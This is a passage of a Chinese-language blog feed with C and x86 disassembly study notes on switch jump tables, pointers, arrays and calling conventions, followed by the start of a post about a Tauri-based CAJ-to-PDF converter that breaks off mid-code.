<p>第一位是符号位，整数填0负数填1<br>尾数部分00001从前往后填，float类型尾数23位，所以尾数是00001000000000000000000<br>指数部分：当使用科学计数法时，小数点向左移，指数的最高位填1，向右移时填0</p>
<p>因为是3次方，所以3-1&#x3D;2，将2转换为2进制，2 &#x3D;&gt; 10</p>
<p>所以指数最后填10</p>
<p>所以8.25的2进制存储格式为 0 10000010 00001000000000000000000</p>
<p>这个数用16进制表示为 -&gt; 0x41040000</p>
<p><img src="/2023/12/15/c/image-20240102153351929.png" alt="image-20240102153351929"></p>
<h3 id="if-if…else"><a href="#if-if…else" class="headerlink" title="if, if…else"></a>if, if…else</h3><p>if语句在编译器编译后，汇编语句比较灵活</p>
<p><img src="/2023/12/15/c/image-20240104195701535.png" alt="image-20240104195701535"></p>
<p><img src="/2023/12/15/c/image-20240104200120721.png" alt="image-20240104200120721"></p>
<p>当条件为a &gt; b时，汇编指令实际上做的是判断a &lt;&#x3D; b：当a &gt; b时，JLE指令不执行，直接按步执行；当a &lt;&#x3D; b时，执行JLE指令，跳过if中的执行语句。</p>
<p>当条件较简单时，编译器也会将汇编编译成TEST。</p>
<h4 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h4><p><img src="/2023/12/15/c/image-20240104200606048.png" alt="image-20240104200606048"></p>
<p>当if中判断不满足条件时，会跳转到else语句内部，当满足条件时，汇编语句会按步向下执行，在else上面的JMP跳过else的执行语句。</p>
<p>所以当判断语句是if…else时，一般中间会有一个JMP指令，用来跳过else执行语句。</p>
<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><h4 id="一般的switch"><a href="#一般的switch" class="headerlink" title="一般的switch"></a>一般的switch</h4><p>一般来说，使用switch分支语句比if的执行效率要高。</p>
<img src="/2023/12/15/c/image-20240104230139273.png" alt="image-20240104230139273" style="zoom:50%;">

<img src="/2023/12/15/c/image-20240104230208618.png" alt="image-20240104230208618" style="zoom:50%;">

<p>当情况较少时，使用if和switch的分支语句的执行效率差不多</p>
<p>但当情况较多时，使用switch的执行效率较高：</p>
<img src="/2023/12/15/c/image-20240104230606347.png" alt="image-20240104230606347" style="zoom: 67%;">

<p>发现switch的跳转语句只有上面一点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00FA18A8	 8B 45 F8             	mov         eax,dword ptr [a]  </span><br><span class="line">00FA18AB	 89 85 30 FF FF FF    	mov         dword ptr [ebp-0D0h],eax  </span><br><span class="line">00FA18B1	 8B 8D 30 FF FF FF    	mov         ecx,dword ptr [ebp-0D0h]  </span><br><span class="line">00FA18B7	 83 E9 01             	sub         ecx,1  </span><br><span class="line">00FA18BA	 89 8D 30 FF FF FF    	mov         dword ptr [ebp-0D0h],ecx  </span><br><span class="line">00FA18C0	 83 BD 30 FF FF FF 05 	cmp         dword ptr [ebp-0D0h],5  </span><br><span class="line">00FA18C7	 77 67                	ja          $LN15+0Fh (0FA1930h)  </span><br><span class="line">00FA18C9	 8B 95 30 FF FF FF    	mov         edx,dword ptr [ebp-0D0h]  </span><br><span class="line">00FA18CF	 FF 24 95 54 19 FA 00 	jmp         dword ptr [edx*4+0FA1954h]  </span><br></pre></td></tr></table></figure>

<p>switch语句在程序启动时已经在内存中生成了一个“跳转表”，在上面的这段汇编指令中，这个跳转表的地址就是从最后一句的0x0FA1954开始的，所以转到内存中查看这个内存地址：</p>
<img src="/2023/12/15/c/image-20240104231216347.png" alt="image-20240104231216347" style="zoom:50%;">

<img src="/2023/12/15/c/image-20240104231939317.png" alt="image-20240104231939317" style="zoom: 50%;">

<p>在内存地址中刚好存了这一段跳转表。</p>
<p>当跳转时，先有一句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00FA18B7	 83 E9 01             	sub         ecx,1</span><br></pre></td></tr></table></figure>

<p>这里减的是switch中最小的那个数，因为原码中写的switch条件是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">switch</span> (a)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1111\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2222\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3333\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;4444\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;5555\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;6666\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;default\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以最后减完的值会放到EDX中，使用EDX偏移计算要跳转的地址</p>
<p>switch运行速度快的第一点是：判断switch_on与最大的值的大小，当switch_on的值比最大的case还要大时，直接跳出switch</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00FA18C0	 83 BD 30 FF FF FF 05 	cmp         dword ptr [ebp-0D0h],5  </span><br><span class="line">00FA18C7	 77 67                	ja          $LN15+0Fh (0FA1930h)  </span><br></pre></td></tr></table></figure>

<p>计算完SUB之后，将计算完的值存到EDX寄存器，然后根据EDX计算跳转地址偏移。</p>
<h4 id="当switch之中的值不是连续的"><a href="#当switch之中的值不是连续的" class="headerlink" title="当switch之中的值不是连续的"></a>当switch之中的值不是连续的</h4><p><img src="/2023/12/15/c/image-20240104233957452.png" alt="image-20240104233957452"></p>
<p>c原码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">switch</span> (a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1111\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2222\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3333\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;4444\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;5555\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;6666\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;default\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="当case的值没有规律时"><a href="#当case的值没有规律时" class="headerlink" title="当case的值没有规律时"></a>当case的值没有规律时</h4><p>当case的值不连续且没有啥规律时，再多的case也可能跟if一样，每一个跳转都会有一个JMP</p>
<p>当原码是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (a)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1111\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2222\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3333\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">998</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;4444\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">999</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;5555\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1000</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;6666\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;default\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现case的值有规律，但是从3到998差了很多，因此用EDX比例因子查内存地址的话，中间要差几百个default的地址，所以在这种情况下也不会使用EDX比例因子找，只会生成一堆JCC跳转指令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">006A5438 8B 45 F8             mov         eax,dword ptr [a]  </span><br><span class="line">006A543B 89 85 30 FF FF FF    mov         dword ptr [ebp-0D0h],eax  </span><br><span class="line">006A5441 81 BD 30 FF FF FF E6 03 00 00 cmp         dword ptr [ebp-0D0h],3E6h  </span><br><span class="line">006A544B 7F 29                jg          __$EncStackInitStart+0AAh (06A5476h)  </span><br><span class="line">006A544D 81 BD 30 FF FF FF E6 03 00 00 cmp         dword ptr [ebp-0D0h],3E6h  </span><br><span class="line">006A5457 74 64                je          __$EncStackInitStart+0F1h (06A54BDh)  </span><br><span class="line">006A5459 83 BD 30 FF FF FF 01 cmp         dword ptr [ebp-0D0h],1  </span><br><span class="line">006A5460 74 2E                je          __$EncStackInitStart+0C4h (06A5490h)  </span><br><span class="line">006A5462 83 BD 30 FF FF FF 02 cmp         dword ptr [ebp-0D0h],2  </span><br><span class="line">006A5469 74 34                je          __$EncStackInitStart+0D3h (06A549Fh)  </span><br><span class="line">006A546B 83 BD 30 FF FF FF 03 cmp         dword ptr [ebp-0D0h],3  </span><br><span class="line">006A5472 74 3A                je          __$EncStackInitStart+0E2h (06A54AEh)  </span><br><span class="line">006A5474 EB 74                jmp         __$EncStackInitStart+11Eh (06A54EAh)  </span><br><span class="line">006A5476 81 BD 30 FF FF FF E7 03 00 00 cmp         dword ptr [ebp-0D0h],3E7h  </span><br><span class="line">006A5480 74 4A                je          __$EncStackInitStart+100h (06A54CCh)  </span><br><span class="line">006A5482 81 BD 30 FF FF FF E8 03 00 00 cmp         dword ptr [ebp-0D0h],3E8h  </span><br><span class="line">006A548C 74 4D                je          __$EncStackInitStart+10Fh (06A54DBh)  </span><br><span class="line">006A548E EB 5A                jmp         __$EncStackInitStart+11Eh (06A54EAh) </span><br><span class="line"></span><br><span class="line">// 在这上面生成了好多JCC指令用来跳转</span><br><span class="line"></span><br><span class="line">006A5490 68 EC 7C 6A 00       push        offset string &quot;1111\n&quot; (06A7CECh)  </span><br><span class="line">006A5495 E8 38 BC FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A549A 83 C4 04             add         esp,4  </span><br><span class="line">006A549D EB 58                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A549F 68 F4 7C 6A 00       push        offset string &quot;2222\n&quot; (06A7CF4h)  </span><br><span class="line">006A54A4 E8 29 BC FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54A9 83 C4 04             add         esp,4  </span><br><span class="line">006A54AC EB 49                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A54AE 68 20 7E 6A 00       push        offset string &quot;3333\n&quot; (06A7E20h)  </span><br><span class="line">006A54B3 E8 1A BC FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54B8 83 C4 04             add         esp,4  </span><br><span class="line">006A54BB EB 3A                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A54BD 68 28 7E 6A 00       push        offset string &quot;4444\n&quot; (06A7E28h)  </span><br><span class="line">006A54C2 E8 0B BC FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54C7 83 C4 04             add         esp,4  </span><br><span class="line">006A54CA EB 2B                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A54CC 68 30 7E 6A 00       push        offset string &quot;5555\n&quot; (06A7E30h)  </span><br><span class="line">006A54D1 E8 FC BB FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54D6 83 C4 04             add         esp,4  </span><br><span class="line">006A54D9 EB 1C                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A54DB 68 38 7E 6A 00       push        offset string &quot;6666\n&quot; (06A7E38h)  </span><br><span class="line">006A54E0 E8 ED BB FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54E5 83 C4 04             add         esp,4  </span><br><span class="line">006A54E8 EB 0D                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A54EA 68 E0 7C 6A 00       push        offset string &quot;default\n&quot; (06A7CE0h)  </span><br><span class="line">006A54EF E8 DE BB FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54F4 83 C4 04             add         esp,4 </span><br></pre></td></tr></table></figure>

<p>因此当使用switch时，连续的case会提高代码的执行速度</p>
<h3 id="do…while"><a href="#do…while" class="headerlink" title="do…while"></a>do…while</h3><p>do…while一般用于先执行后判断</p>
<h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>for循环在反汇编中的形式</p>
<p><img src="/2023/12/15/c/image-20240108191715316.png" alt="image-20240108191715316"></p>
<p>for循环的执行效率可能不是特别高，但是可读性比较好，比较容易写</p>
<p>for循环的第一个和第三个表达式可以使用逗号连接多个表达式，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span>; i&lt;=<span class="number">10</span>, i++,j++,k++)</span><br><span class="line">&#123;</span><br><span class="line">	print(<span class="string">&quot;%d %d %d\n&quot;</span>, i, j, k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h3><h3 id="结构体数组的定义"><a href="#结构体数组的定义" class="headerlink" title="结构体数组的定义"></a>结构体数组的定义</h3><h4 id="定义结构体"><a href="#定义结构体" class="headerlink" title="定义结构体"></a>定义结构体</h4><p><code>类型 变量名[常量表达式]</code></p>
<p>定义结构题类型<br>struct stStudent<br>{<br>    int Age;<br>    int Level;<br>}</p>
<p>定义结构体变量<br>struct stStudent st;</p>
<p>定义结构题数组<br>struct stStudent arr[10] 或者 stStudent arr[10]</p>
<p>结构体数组的赋值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MyStruct</span> <span class="title">arr</span>[3] =</span> &#123; &#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">2</span>,<span class="number">2</span>&#125; &#125;;</span><br><span class="line">或</span><br><span class="line">arr[<span class="number">0</span>].Age = <span class="number">10</span>;</span><br><span class="line">arr[<span class="number">0</span>].Level = <span class="number">100</span>;</span><br></pre></td></tr></table></figure>

<img src="/2023/12/15/c/image-20240227084341723.png" alt="image-20240227084341723" style="zoom:50%;">

<h4 id="结构体数组中字符串成员的处理"><a href="#结构体数组中字符串成员的处理" class="headerlink" title="结构体数组中字符串成员的处理"></a>结构体数组中字符串成员的处理</h4><p><img src="/2023/12/15/c/image-20240227085527133.png" alt="image-20240227085527133"></p>
<h3 id="指针类型"><a href="#指针类型" class="headerlink" title="指针类型"></a>指针类型</h3><p>任何类型都可以带上<code>*</code>，加上<code>*</code>以后是新的类型，统称为“指针类型”。</p>
<p><code>*</code>可以是任意多个。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* x;</span><br><span class="line"><span class="type">short</span>* y;</span><br><span class="line"><span class="type">int</span>* z;</span><br><span class="line"><span class="type">float</span>* f;</span><br><span class="line"><span class="type">double</span>* d;</span><br><span class="line">Student* st;（结构体）</span><br></pre></td></tr></table></figure>

<p>指针变量的赋值</p>
<img src="/2023/12/15/c/image-20240227092130958.png" alt="image-20240227092130958" style="zoom:50%;"> 

<img src="/2023/12/15/c/image-20240227092215037.png" alt="image-20240227092215037" style="zoom: 50%;"> 

<p><strong>指针变量宽度</strong></p>
<p>指针类型的变量宽度永远是4字节、无论指针类型是什么，无论是几级指针</p>
<p><strong>指针变量的自加自减</strong></p>
<p>1、不带<code>*</code>类型的变量，++或者–都是加1或者减1<br>2、带<code>*</code>类型的变量，++或者–新增（减少）的数量是去掉一个<code>*</code>后变量的宽度</p>
<p>也就是当指针变量是一级指针时，指针自加后，char类型会加1，short类型会加2.int类型会加4</p>
<p>当指针变量是二级以上时，指针自加后，都会加4，因为这时去掉一个<code>*</code>后，宽度都是指针的宽度4.</p>
<p><strong>指针的加减运算</strong></p>
<p>指针不能进行乘除运算，只能加减。</p>
<p>当指针时多级指针时：</p>
<p><img src="/2023/12/15/c/image-20240227094643479.png" alt="image-20240227094643479"></p>
<p>当指针是一级指针时</p>
<p><img src="/2023/12/15/c/image-20240227094725042.png" alt="image-20240227094725042"></p>
<p>总结：</p>
<img src="/2023/12/15/c/image-20240227094928263.png" alt="image-20240227094928263" style="zoom:33%;"> 

<p><strong>指针取值方式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(p+i)=p[i]</span><br><span class="line">*(*(p+i)+k)=p[i][k]</span><br><span class="line">*(*(*(p+i)+k)+m)=p[i][k][m]</span><br><span class="line">*(*(*(*(*(p+i)+k)+m)+w)+t)=p[i][k][m][W][t]</span><br><span class="line">*()与[]可以相互转换</span><br></pre></td></tr></table></figure>

<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="数组参数传递"><a href="#数组参数传递" class="headerlink" title="数组参数传递"></a>数组参数传递</h4><p>在反汇编中，<code>arr[i]</code>等价于<code>*(p+i)</code>，使用函数传递数组参数时，传递的是数组的首地址，并且传送时不会传递数组的宽度。要使用数组的宽度时，必须要把数组的宽度也传递进去。</p>
<p>在函数中使用数组，如果是按照指针传递的数组，在使用时也可以按照数组来使用；如果是按照数组传递的参数，也可以按照指针的方式来使用。</p>
<h3 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h3><h4 id="字符串的定义方式"><a href="#字符串的定义方式" class="headerlink" title="字符串的定义方式"></a>字符串的定义方式</h4><ol>
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">5</span>] = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str);</span><br></pre></td></tr></table></figure>

<p>程序会找到<code>&#39;\0&#39;</code>或者<code>0</code>来停止寻找字符串</p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[] = <span class="string">&quot;ABCDEF&quot;</span>;		<span class="comment">// 在常量区找一段空间放，然后在复制到数组中，因为复制到数组中才可以对其进行修改，比如str[0]=‘K&#x27;，然后就变成了&quot;KBCDE&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* str = <span class="string">&quot;ABCDE&quot;</span></span><br></pre></td></tr></table></figure>

<p>这种方式是将字符串放在了常量区，但是没有复制到字符数组中，所以这样定义的字符串只能读，不能写（也有可以改的方法）</p>
<h4 id="处理字符串函数"><a href="#处理字符串函数" class="headerlink" title="处理字符串函数"></a>处理字符串函数</h4><p><strong>1.int strlrn(char *  str)</strong></p>
<p>返回值是字符串s的长度。不包括结束符’\0’。、</p>
<p><strong>2.char * strcpy(char * dest, char * src);</strong></p>
<p>复制字符串src到dest中，返回值为dest的值。</p>
<p><strong>3.char * strcat(char * dest, char * src);</strong></p>
<p>将字符串src添加到dest尾部，返回值为dest的值。</p>
<p><strong>4.int strcmp(char * str1, char * str2);</strong></p>
<p>一样返回0，不一样返回非0</p>
<h3 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h3><p>首先定义一个结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给结构体赋值、定义结构体指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Point p = &#123; <span class="number">1</span>, <span class="number">2</span> &#125;;</span><br><span class="line">Point* px = &amp;p;</span><br></pre></td></tr></table></figure>

<p>通过指针读取结构体时不用<code>.</code>，而是用<code>-&gt;</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = px-&gt;x		| x = <span class="number">1</span></span><br><span class="line"><span class="type">int</span> y = px-&gt;y		| y = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>通过结构体指针修改结构体成员数值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">px-&gt;y = <span class="number">100</span>			| y = <span class="number">100</span></span><br></pre></td></tr></table></figure>

<h3 id="指针数组-与-数组指针"><a href="#指针数组-与-数组指针" class="headerlink" title="指针数组 与 数组指针"></a>指针数组 与 数组指针</h3><h4 id="指针数组的赋值"><a href="#指针数组的赋值" class="headerlink" title="指针数组的赋值"></a>指针数组的赋值</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> * a = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> * b = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"></span><br><span class="line">&lt;<span class="number">1</span>&gt;</span><br><span class="line"><span class="type">char</span> * arr[<span class="number">2</span>] = &#123;a, b&#125;;</span><br><span class="line"></span><br><span class="line">&lt;<span class="number">2</span>&gt;</span><br><span class="line"><span class="type">char</span> * arr[<span class="number">2</span>];</span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&lt;<span class="number">3</span>&gt;</span><br><span class="line"><span class="type">char</span> * arr[<span class="number">2</span>] = &#123;</span><br><span class="line">	<span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">	<span class="string">&quot;张三&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数组指针的定义"><a href="#数组指针的定义" class="headerlink" title="数组指针的定义"></a>数组指针的定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>(*px) [<span class="number">5</span>];			<span class="comment">//一维数组指针</span></span><br><span class="line"><span class="type">char</span>(*px) [<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>(*px)[<span class="number">2</span>][<span class="number">2</span>];			<span class="comment">//二维数组指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>(*px)[<span class="number">3</span>][<span class="number">3</span>][<span class="number">3</span>];		<span class="comment">//三维数组指针</span></span><br></pre></td></tr></table></figure>

<p><strong><code>int* p[5]</code>和<code>int (*p)[5]</code>的区别：</strong></p>
<p><code>int* p[5]</code>：<code>[]</code>的优先级高于<code>*</code>，所以<code>int* p[]</code>是一个<code>(int*)</code>类型的指针数组，p本质上是一个<strong>数组</strong>；</p>
<p><code>int (*p)[5]</code>：<code>()</code>的优先级高于<code>[]</code>，所以p先与<code>*</code>结合，是一个指针，指针的类型是一个<code>int[]</code>数组，<code>int (*p)[]</code>是一个数组指针，p本质上是一个<strong>指针</strong>。</p>
<p><strong>???</strong></p>
<p><img src="/2023/12/15/c/image-20240228003021496.png" alt="image-20240228003021496"></p>
<p><img src="/2023/12/15/c/image-20240228004935994.png" alt="image-20240228004935994"></p>
<h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><table>
<thead>
<tr>
<th>调用约定</th>
<th>参数压栈顺序</th>
<th>平衡堆栈方式</th>
</tr>
</thead>
<tbody><tr>
<td>__cdecl</td>
<td>从右至左入栈</td>
<td>调用者清理栈</td>
</tr>
<tr>
<td>__stdcall</td>
<td>从右至左入栈</td>
<td>自身清理堆栈</td>
</tr>
<tr>
<td>__fastcall</td>
<td>ECX&#x2F;EDX传递前两个参数，剩下还多的，从右至左入栈</td>
<td>自身清理堆栈</td>
</tr>
</tbody></table>
<h3 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h3><p><strong>定义函数指针变量：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> (__cdecl *pFun)(<span class="type">int</span>, <span class="type">int</span>);</span><br></pre></td></tr></table></figure>

<p><strong>为指针变量赋值：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pFun = (<span class="type">int</span> (__cdecl *)(<span class="type">int</span>, <span class="type">int</span>))<span class="number">10</span>;		<span class="comment">// 这里随便赋了一个10，使用时应该赋一个函数的地址</span></span><br></pre></td></tr></table></figure>

<p><strong>使用函数指针变量：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> r = pFun(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>caj2pdf</title>
    <url>/2025/04/04/caj2pdf/</url>
    <content><![CDATA[<p>caj转pdf</p>
<p>某天拿到了一个caj转pdf的工具，是用pyQt写的，好像大小得100MB，就把这个拆解了一下然后用Tauri重新写了一下前端，同时练一练刚学的Tauri。</p>
<span id="more"></span>

<p>仓库：<a href="https://github.com/Creeeeeeeeeeper/caj2pdf">Creeeeeeeeeeper&#x2F;caj2pdf: CAJ file convert to PDF, based on Tauri (github.com)</a></p>
<p>可以直接下载release版（仅测试过Win11）</p>
<p><img src="/2025/04/04/caj2pdf/PixPin_2025-04-04_19-09-13.gif" alt="PixPin_2025-04-04_19-09-13"></p>
<br>

<p><strong>下面记录一下在开发过程中遇到的几个问题</strong>：</p>
<blockquote>
<p>1.Tauri使用的js是原生的js，不是nodejs，没法直接获取文件的绝对路径</p>
</blockquote>
<p>因为要构建命令行，所以需要获取到文件的绝对路径传到参数上，这里仅需要这个路径即可，也不需要将这个文件同时读取出来，所以就直接用的rust获取这个路径，js只负责调用一下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> rfd::FileDialog;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[tauri::command]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">get_files</span>() <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">String</span>, <span class="type">String</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> FileDialog::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">pick_files</span>() &#123;</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(paths) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">paths_str</span>: <span class="type">Vec</span>&lt;<span class="type">String</span>&gt; = paths.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">map</span>(|path| path.<span class="title function_ invoke__">display</span>().<span class="title function_ invoke__">to_string</span>()).<span class="title function_ invoke__">collect</span>();</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(paths_str.<span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="literal">None</span> =&gt; <span class="title function_ invoke__">Err</span>(<span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;No file 